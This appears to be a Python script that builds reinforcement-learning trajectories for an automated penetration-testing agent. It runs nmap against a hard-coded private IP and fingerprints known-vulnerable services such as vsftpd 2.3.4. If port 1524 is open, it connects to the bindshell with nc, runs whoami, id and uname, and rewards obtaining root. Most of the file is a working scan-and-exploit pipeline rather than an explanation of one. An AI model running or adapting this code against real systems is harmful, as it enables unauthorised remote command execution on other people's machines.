import json
import subprocess
from datetime import datetime, UTC
from pathlib import Path


TARGET_IP = "10.11.202.189"
TRAJ_ID = "auto_traj_001"

RAW_DIR = Path("real_logs/raw")
TRAJ_DIR = Path("real_logs/trajectories")


def ensure_dirs():
    RAW_DIR.mkdir(parents=True, exist_ok=True)
    TRAJ_DIR.mkdir(parents=True, exist_ok=True)


def now_str():
    return datetime.now(UTC).strftime("%Y-%m-%dT%H-%M-%SZ")


def run_nmap(target: str) -> str:
    print("[*] Running nmap...")
    result = subprocess.run(
        ["nmap", "-sV", "-sC", target],
        capture_output=True,
        text=True,
        timeout=120
    )

    if result.returncode != 0:
        raise RuntimeError(f"nmap failed: {result.stderr}")

    return result.stdout


def save_raw_nmap(output: str, target: str) -> str:
    filename = RAW_DIR / f"nmap_{target}_{now_str()}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(output)
    return str(filename)


def parse_open_ports(nmap_output: str) -> list[int]:
    ports = []

    for line in nmap_output.splitlines():
        line = line.strip()
        if "/tcp" in line and " open " in line:
            try:
                port = int(line.split("/")[0])
                ports.append(port)
            except ValueError:
                continue

    return ports


def parse_service_map(nmap_output: str) -> dict:
    """
    解析 nmap 主表中的端口、服务、版本
    例如：
    21/tcp   open  ftp         vsftpd 2.3.4
    ->
    {
      "21": {"service": "ftp", "version": "vsftpd 2.3.4"}
    }
    """
    service_map = {}

    for line in nmap_output.splitlines():
        raw = line.rstrip()
        line = raw.strip()

        if "/tcp" in line and " open " in line:
            parts = line.split()
            if len(parts) >= 3:
                port_proto = parts[0]          # 21/tcp
                state = parts[1]               # open
                service = parts[2]             # ftp
                version = " ".join(parts[3:]) if len(parts) > 3 else ""

                if state == "open":
                    port = port_proto.split("/")[0]
                    service_map[port] = {
                        "service": service,
                        "version": version
                    }

    return service_map


def build_state_summary(open_ports: list[int], service_map: dict) -> dict:
    """
    提炼成更适合后续训练的状态摘要
    """
    services = {info["service"] for info in service_map.values()}
    versions = " | ".join(
        f'{port}:{info["version"]}'
        for port, info in service_map.items()
        if info["version"]
    )

    summary = {
        "num_open_ports": len(open_ports),
        "has_ftp": "ftp" in services,
        "has_ssh": "ssh" in services,
        "has_telnet": "telnet" in services,
        "has_http": "http" in services,
        "has_samba": any(
            "samba" in info["version"].lower()
            for info in service_map.values()
        ),
        "has_mysql": "mysql" in services,
        "has_postgresql": "postgresql" in services,
        "has_bindshell_1524": 1524 in open_ports,
        "has_tomcat": any(
            "tomcat" in info["version"].lower()
            for info in service_map.values()
        ),
        "has_vsftpd_234": any(
            "vsftpd 2.3.4" in info["version"].lower()
            for info in service_map.values()
        ),
        "version_fingerprint": versions
    }

    return summary


def choose_action(open_ports: list[int], state_summary: dict) -> str:
    """
    先保持最简单策略：
    只要 1524 开着，就优先连 bindshell
    """
    if 1524 in open_ports:
        return "connect_1524_bindshell"
    return "no_exploit"


def try_bindshell(target: str) -> dict:
    print("[*] Trying bindshell...")
    commands = "whoami\nid\nuname -a\nexit\n"

    try:
        result = subprocess.run(
            ["nc", target, "1524"],
            input=commands,
            capture_output=True,
            text=True,
            timeout=8
        )

        stdout = result.stdout.strip()
        stderr = result.stderr.strip()

        shell_obtained = (
            "root@" in stdout
            or "uid=0(" in stdout
            or "uid=0(root)" in stdout
        )

        return {
            "success": shell_obtained,
            "stdout": stdout,
            "stderr": stderr,
            "returncode": result.returncode
        }

    except subprocess.TimeoutExpired as e:
        return {
            "success": False,
            "stdout": e.stdout if e.stdout else "",
            "stderr": "TimeoutExpired",
            "returncode": -1
        }
    except Exception as e:
        return {
            "success": False,
            "stdout": "",
            "stderr": str(e),
            "returncode": -1
        }


def save_trajectory(data: dict, traj_id: str) -> str:
    filename = TRAJ_DIR / f"{traj_id}.json"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    return str(filename)


def main():
    ensure_dirs()

    trajectory = {
        "trajectory_id": TRAJ_ID,
        "target": TARGET_IP,
        "created_at": datetime.now(UTC).isoformat(),
        "steps": []
    }

    try:
        # Step 0: scan
        nmap_output = run_nmap(TARGET_IP)
        raw_path = save_raw_nmap(nmap_output, TARGET_IP)

        open_ports = parse_open_ports(nmap_output)
        service_map = parse_service_map(nmap_output)
        state_summary = build_state_summary(open_ports, service_map)

        trajectory["steps"].append({
            "step": 0,
            "action": "scan_nmap",
            "observation": {
                "target_ip": TARGET_IP
            },
            "result": {
                "open_ports": open_ports,
                "service_map": service_map,
                "state_summary": state_summary,
                "raw_nmap_path": raw_path
            },
            "reward": 0,
            "done": False
        })

        # Step 1: decision
        decision = choose_action(open_ports, state_summary)

        trajectory["steps"].append({
            "step": 1,
            "action": "decision",
            "observation": {
                "open_ports": open_ports,
                "state_summary": state_summary
            },
            "result": {
                "chosen_action": decision
            },
            "reward": 0,
            "done": False
        })

        # Step 2: execute
        if decision == "connect_1524_bindshell":
            shell_result = try_bindshell(TARGET_IP)

            trajectory["steps"].append({
                "step": 2,
                "action": "connect_1524_bindshell",
                "observation": {
                    "port_1524_open": 1524 in open_ports,
                    "has_bindshell_1524": state_summary["has_bindshell_1524"]
                },
                "result": shell_result,
                "reward": 10 if shell_result["success"] else -1,
                "done": True
            })
        else:
            trajectory["steps"].append({
                "step": 2,
                "action": "no_exploit",
                "observation": {
                    "open_ports": open_ports,
                    "state_summary": state_summary
                },
                "result": {
                    "message": "No supported exploit selected"
                },
                "reward": 0,
                "done": True
            })

        traj_path = save_trajectory(trajectory, TRAJ_ID)
        print(f"[✓] Trajectory saved to {traj_path}")

    except Exception as e:
        trajectory["steps"].append({
            "step": len(trajectory["steps"]),
            "action": "error",
            "observation": {},
            "result": {
                "error": str(e)
            },
            "reward": -10,
            "done": True
        })
        traj_path = save_trajectory(trajectory, TRAJ_ID)
        print(f"[!] Error occurred: {e}")
        print(f"[!] Partial trajectory saved to {traj_path}")


if __name__ == "__main__":
    main()
